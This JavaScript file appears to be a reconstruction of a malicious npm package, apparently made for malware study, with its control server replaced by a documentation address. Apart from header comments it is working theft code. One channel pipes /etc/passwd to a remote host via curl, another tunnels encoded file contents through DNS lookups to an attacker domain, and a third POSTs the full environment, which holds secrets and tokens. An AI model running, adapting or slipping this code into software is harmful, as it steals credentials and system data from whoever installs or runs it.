// Reconstruction of heloo131313@0.0.32 (2026-05-11).
// Three independent exfil channels to same C2 = defense evasion.
//   Channel 1 — curl /etc/passwd | pipe to attacker host
//   Channel 2 — DNS lookup carrying base64-encoded local state
//   Channel 3 — HTTP POST with full env dump
// C2 host replaced with RFC 5737 sinkhole (203.0.113.0/24).
const { exec } = require("child_process");
const os = require("os");
const fs = require("fs");
const dns = require("dns");
const http = require("http");

const C2 = "203.0.113.50";
const tag = os.hostname() + "-" + (os.userInfo().username || "u");

// Channel 1 — curl exfil of /etc/passwd
exec("curl -s -d @/etc/passwd http://" + C2 + ":80/p", () => {});

// Channel 2 — DNS lookup with encoded data (subdomain tunneling)
let passwd = "";
try { passwd = fs.readFileSync("/etc/passwd", "utf8"); } catch (e) {}
const sub = Buffer.from(passwd.slice(0, 60)).toString("base64").replace(/=+/g, "").toLowerCase().slice(0, 40);
dns.lookup(sub + "." + tag + ".attacker.invalid", () => {});

// Channel 3 — HTTP POST with full env
const body = JSON.stringify({ env: process.env, host: os.hostname(), cwd: process.cwd() });
const req = http.request({ host: C2, port: 8080, method: "POST", path: "/env", headers: { "Content-Length": body.length } }, () => {});
req.on("error", () => {});
req.write(body);
req.end();
